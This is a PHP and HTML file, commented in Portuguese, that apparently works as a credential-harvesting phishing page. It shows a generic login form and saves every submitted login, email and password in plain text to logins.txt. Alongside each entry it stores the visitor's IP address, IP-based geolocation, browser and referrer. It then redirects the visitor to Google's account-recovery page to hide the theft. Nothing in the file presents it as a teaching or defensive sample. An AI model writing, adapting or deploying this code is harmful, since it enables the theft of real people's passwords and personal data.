<?php
// index.php

// Se vier via POST, processa e salva
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // === Campos do formulário ===
    $login  = $_POST['login']  ?? '';
    $email  = $_POST['email']  ?? '';
    $senha  = $_POST['senha']  ?? '';

    // === Metadados do servidor ===
    $ip         = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $userAgent  = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
    $referrer   = $_SERVER['HTTP_REFERER'] ?? 'N/A';
    $dataHora   = date('Y-m-d H:i:s');

    // === Geolocalização via IP usando cURL ===
    $pais   = 'Desconhecido';
    $cidade = 'Desconhecida';
    $regiao = 'Desconhecida';
    $isp    = 'Desconhecido';

    $url = "http://ip-api.com/json/$ip?lang=pt";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $resultado = curl_exec($ch);
    if ($resultado !== false) {
        $geo = json_decode($resultado, true);
        if (isset($geo['status']) && $geo['status'] === 'success') {
            $pais   = $geo['country']     ?? $pais;
            $cidade = $geo['city']        ?? $cidade;
            $regiao = $geo['regionName']  ?? $regiao;
            $isp    = $geo['isp']         ?? $isp;
        }
    }
    curl_close($ch);

    // === Formata a linha de log exatamente no estilo pedido ===
    $linha  = "Login: $login | Email: $email | Senha: $senha";
    $linha .= " | IP: $ip | Cidade: $cidade | Região: $regiao | País: $pais | ISP: $isp";
    $linha .= " | Agente: $userAgent | Referrer: $referrer | Data/Hora: $dataHora\n";

    // === Grava em logins.txt (mesmo diretório) ===
    file_put_contents(__DIR__ . "/logins.txt", $linha, FILE_APPEND);

    // === Redireciona para uma página de “aguarde…” ou similar ===
    header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
    exit;
}
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Login</title>
  <style>
    body { font-family: Arial, sans-serif; }
    form { max-width: 320px; margin: 50px auto; padding: 20px; border: 1px solid #ccc; border-radius: 4px; }
    label, input { display: block; width: 100%; margin-bottom: 10px; }
    input { padding: 8px; box-sizing: border-box; }
    button { padding: 10px 15px; width: 100%; }
  </style>
</head>
<body>
  <form method="POST" action="">
    <h2>Faça login</h2>

    <label for="login">Login:</label>
    <input type="text" name="login" id="login" required>

    <label for="email">Email:</label>
    <input type="email" name="email" id="email" required>

    <label for="senha">Senha:</label>
    <input type="password" name="senha" id="senha" required>

    <button type="submit">Entrar</button>
  </form>
</body>
</html>
